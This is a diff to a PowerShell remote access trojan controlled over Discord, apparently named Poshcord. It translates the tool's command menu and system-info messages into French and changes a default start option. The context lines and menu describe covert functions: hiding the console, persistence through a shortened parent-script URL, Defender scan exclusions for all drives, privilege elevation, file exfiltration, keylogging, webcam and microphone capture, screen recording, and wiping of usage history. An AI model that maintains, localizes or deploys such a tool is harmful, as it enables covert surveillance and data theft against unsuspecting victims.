@@ -24,7 +24,7 @@ $global:token = "$tk" # make sure your bot is in ONE server only
 $HideConsole = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 $spawnChannels = 1 # Create new channel on session start
 $InfoOnConnect = 1 # Generate client info message on session start
-$defaultstart = 1 # Option to start all jobs automatically upon running
+$defaultstart = 0 # Option to start all jobs automatically upon running
 $parent = "https://is.gd/bwdcc2" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
@@ -41,7 +41,7 @@ $timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
 # =============================================================== MODULE FUNCTIONS =========================================================================
 # Download ffmpeg.exe function (dependency for media capture) 
 Function GetFfmpeg{
-    sendMsg -Message ":hourglass: ``Downloading FFmpeg to Client.. Please Wait`` :hourglass:"
+    sendMsg -Message ":hourglass: ``Téléchargement de FFmpeg sur le client. Veuillez patienter...`` :hourglass:"
     $Path = "$env:Temp\ffmpeg.exe"
     $tempDir = "$env:temp"
     If (!(Test-Path $Path)){  
@@ -210,13 +210,13 @@ Function quickInfo{
                 "description" = @"
 ``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
 :man_detective: **User Information** :man_detective:
-- **Current User**          : ``$env:USERNAME``
-- **Email Address**         : ``$email``
+- **Utilisateur actuel**          : ``$env:USERNAME``
+- **Adresse email**         : ``$email``
 - **Language**              : ``$systemLanguage``
-- **Administrator Session** : ``$adminperm``
+- **Session administrateur** : ``$adminperm``
 
 :minidisc: **OS Information** :minidisc:
-- **Current OS**            : ``$OSString - $ver``
+- **OS actuel**            : ``$OSString - $ver``
 - **Architechture**         : ``$OSArch``
 
 :globe_with_meridians: **Network Information** :globe_with_meridians:
@@ -224,15 +224,15 @@ Function quickInfo{
 - **Location Information**  : ``$GPS``
 
 :desktop: **Hardware Information** :desktop:
-- **Processor**             : ``$processor`` 
-- **Memory**                : ``$RamInfo``
+- **Processeur**             : ``$processor`` 
+- **Memoire**                : ``$RamInfo``
 - **Gpu**                   : ``$gpu``
-- **Screen Size**           : ``$screensize``
+- **Taille de l'écran**           : ``$screensize``
 
 ``````COMMAND LIST``````
-- **Options**               : Show The Options Menu
-- **ExtraInfo**             : Show The Extra Info Menu
-- **Close**                 : Close this session
+- **Options**               : Afficher le menu des options
+- **ExtraInfo**             : Afficher le menu d'informations supplémentaires
+- **Close**                 : Fermer cette session ( Irreversible )
 
 "@
                 color       = 65280
@@ -270,52 +270,52 @@ $script:jsonPayload = @{
             "description" = @"
 
 ### SYSTEM
-- **AddPersistance**: Add this script to startup.
-- **RemovePersistance**: Remove Poshcord from startup
-- **IsAdmin**: Check if the session is admin
-- **Elevate**: Attempt to restart script as admin (!user popup!)
-- **ExcludeCDrive**: Exclude C:/ Drive from all Defender Scans
-- **ExcludeAllDrives**: Exclude C:/ - G:/ Drives from Defender Scans
-- **EnableIO**: Enable Keyboard and Mouse (admin only)
-- **DisableIO**: Disable Keyboard and Mouse (admin only)
-- **Exfiltrate**: Send various files. (see ExtraInfo)
-- **Upload**: Upload a file. (see ExtraInfo)
-- **Download**: Download a file. (attach a file with the command)
-- **StartUvnc**: Start UVNC client `StartUvnc -ip 192.168.1.1 -port 8080`
-- **SpeechToText**: Send audio transcript to Discord
-- **EnumerateLAN**: Show devices on LAN (see ExtraInfo)
-- **NearbyWifi**: Show nearby wifi networks (!user popup!)
-- **RecordScreen**: Record Screen and send to Discord
+- **AddPersistance**: Ajoutez ce script au démarrage.
+- **RemovePersistance**: Supprime le script du démarrage
+- **IsAdmin**: Vérifiez si la session est admin
+- **Elevate**: Tenter de redémarrer le script en tant qu'administrateur (!user popup!)
+- **ExcludeCDrive**: Exclure le lecteur C:/ de toutes les analyses Defender
+- **ExcludeAllDrives**: Exclure les lecteurs C:/ - G:/ des analyses Defender
+- **EnableIO**: Activer le clavier et la souris (administrateur uniquement)
+- **DisableIO**: Désactiver le clavier et la souris (administrateur uniquement)
+- **Exfiltrate**: Envoyer divers fichiers. (voir ExtraInfo)
+- **Upload**: Télécharger un fichier. (voir ExtraInfo)
+- **Download**: Télécharger un fichier. (joindre un fichier avec la commande)
+- **StartUvnc**: Démarrer le client UVNC `StartUvnc -ip 192.168.1.1 -port 8080`
+- **SpeechToText**: Envoyer la transcription audio sur Discord
+- **EnumerateLAN**: Afficher les périphériques sur le LAN (voir ExtraInfo)
+- **NearbyWifi**: Afficher les réseaux Wi-Fi à proximité (!user popup!)
+- **RecordScreen**: Enregistrer l'écran et l'envoyer à Discord
 
 ### PRANKS
-- **FakeUpdate**: Spoof Windows-10 update screen using Chrome
-- **Windows93**: Start parody Windows93 using Chrome
-- **WindowsIdiot**: Start fake Windows95 using Chrome
-- **SendHydra**: Never ending popups (use killswitch) to stop
-- **SoundSpam**: Play all Windows default sounds on the target
-- **Message**: Send a message window to the User (!user popup!)
-- **VoiceMessage**: Send a message window to the User (!user popup!)
-- **MinimizeAll**: Send a voice message to the User
-- **EnableDarkMode**: Enable System wide Dark Mode
-- **DisableDarkMode**: Disable System wide Dark Mode
-- **ShortcutBomb**: Create 50 shortcuts on the desktop.
-- **Wallpaper**: Set the wallpaper (wallpaper -url http://img.com/f4wc)
-- **Goose**: Spawn an annoying goose (Sam Pearson App)
-- **ScreenParty**: Start A Disco on screen!
+- **FakeUpdate**: Usurper l'écran de mise à jour de Windows 10 à l'aide de Chrome
+- **Windows93**: Démarrer la parodie de Windows 93 en utilisant Chrome
+- **WindowsIdiot**: Démarrer un faux Windows 95 à l'aide de Chrome
+- **SendHydra**: Never ending popups (utilisez le killswitch pour arrêter)
+- **SoundSpam**: Jouer tous les sons par défaut de Windows sur la cible
+- **Message**: Envoyer une fenêtre de message à l'utilisateur (!user popup!)
+- **VoiceMessage**: Envoyer une fenêtre de message à l'utilisateur (!user popup!)
+- **MinimizeAll**: Envoyer un message vocal à l'utilisateur
+- **EnableDarkMode**: Activer le mode sombre du système
+- **DisableDarkMode**: Désactiver le mode sombre du système
+- **ShortcutBomb**: Créez 50 raccourcis sur le bureau.
+- **Wallpaper**: Définir le fond d'écran (wallpaper -url http://img.com/f4wc)
+- **Goose**: Engendrer Goose (!user popup!)
+- **ScreenParty**: Démarrez une discothèque à l'écran !
 
 ### JOBS
-- **Microphone**: Record microphone clips and send to Discord
-- **Webcam**: Stream webcam pictures to Discord
-- **Screenshots**: Sends screenshots of the desktop to Discord
-- **Keycapture**: Capture Keystrokes and send to Discord
-- **SystemInfo**: Gather System Info and send to Discord
+- **Microphone**: Enregistrez des clips de microphone et envoyez-les sur Discord
+- **Webcam**: Diffusez des images de webcam sur Discord
+- **Screenshots**: Envoie des captures d'écran du bureau à Discord
+- **Keycapture**: Capturez les frappes au clavier et envoyez-les à Discord
+- **SystemInfo**: Collectez les informations système et envoyez-les à Discord
 
 ### CONTROL
-- **ExtraInfo**: Get a list of further info and command examples
-- **Cleanup**: Wipe history (run prompt, powershell, recycle bin, Temp)
-- **Kill**: Stop a running module (eg. Exfiltrate)
-- **PauseJobs**: Pause the current jobs for this session
-- **Close**: Close this session
+- **ExtraInfo**: Obtenez une liste d'informations supplémentaires et d'exemples de commandes
+- **Cleanup**: Effacer l'historique (fenetre excuter, PowerShell, corbeille, Temporaire)
+- **Kill**: Arrêter un module en cours d'exécution (eg. Exfiltrate)
+- **PauseJobs**: Suspendre les tâches en cours pour cette session
+- **Close**: Fermer cette session ( Irreversible )
 "@
             color       = 65280
         }
